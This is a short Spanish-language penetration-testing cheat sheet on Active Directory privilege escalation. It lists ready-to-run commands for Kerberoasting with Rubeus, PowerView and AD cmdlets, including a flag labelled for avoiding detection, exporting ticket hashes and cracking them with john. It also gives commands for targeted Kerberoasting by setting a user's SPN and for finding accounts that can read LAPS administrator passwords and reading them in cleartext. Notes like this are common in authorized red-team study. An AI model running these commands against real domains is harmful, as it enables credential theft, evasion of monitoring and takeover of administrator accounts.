# Privilege Escalation

Kerberos

Los clientes necesitan obtener tickets del KDC (Key Distribution Center) el cual corre como un servicio en el controlador del dominio. Estos tickets representan las credenciales de los clientes.

Priv.Esc. Kerberoast:

-Brute-Force passwords

-Ticket-Granting Service (TGS) tiene una porcion del servidor el cual esta encriptado con la contraseña del servicio de la cuenta. Esto hace posible pedir un ticket y hacer offline brute-force.

-Comands:

AD: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`

`Set-ADUser -Identity *-ServicePrincipalNames @{Add='**'} -Verbose`

PowerView: `Get-DomainUser –SPN`

Rubeus: ejecutar desde cmd (NO PS)

-List: 

-Stats: `Rubeus.exe kerberoast /stats`

-Request TGS: `Rubeus.exe kerberoast /user:<username> /simple`

-Avoid detections: `Rubeus.exe kerberoast /stats /rc4opsec`

-All acounts: `Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`

-Crack ticket with john: 

`john.exe --wordlist=C:passwordlist.txt C:\hashes.txt`

**Privilege Escalation - Targeted Kerberoasting - Set SPN**

Vemos si el usuario tiene SPN:

PowerView:  `Get-DomainUser -Identity USERNAME | select serviceprincipalname`

AD: `Get-ADUser -Identity USERNAME -Properties ServicePrincipalName | select ServicePrincipalName`

Seteamos SPN para el usuario (solo en el dominio):

PowerView:  `Set-DomainObject -Identity USERNAME -Set @{serviceprincipalname='us/myspnX'}`

AD: `Set-ADUser -Identity USERNAME -ServicePrincipalNames @{Add='us/myspnX'}`

kerberoast el usuario y lo crackeas.

**Privilege Escalation - LAPS**

Si LAPS (Local Administrator Passwords Solution) está en uso la encontraremos en la ruta: C:\Program Files\LAPS\CSE\admpwd.dll

Para buscar usuarios que puedan leer la contraseña filtrando por "ms-Mcs-AdmPwd": 

PowerView:

`Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($*.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($*.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $*.SecurityIdentifier);$*}`

Para enumerar las OUs donde LAPS está en uso junto con los usuarios que pueden leer el contraseñas en texto no cifrado:

AD Module: `Get-LapsPermissions.ps1`

LAPS Module: `Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1` && `Find-AdmPwdExtendedRights -Identity OUDistinguishedName`

Priv. Esc. LAPS Abuse

Una vez que comprometemos al usuario que tiene los derechos, utilice lo siguiente para leer la contraseña de texto no cifrado:

PowerView: `Get-ADObject -SamAccountName  | select -ExpandProperty ms-mcs-admpwd`

AD: `Get-ADComputer -Identity <targetmachine> -Properties msmcs-admpwd | select -ExpandProperty ms-mcs-admpwd`

LAPS module: `Get-AdmPwdPassword -ComputerName <targetmachine>`
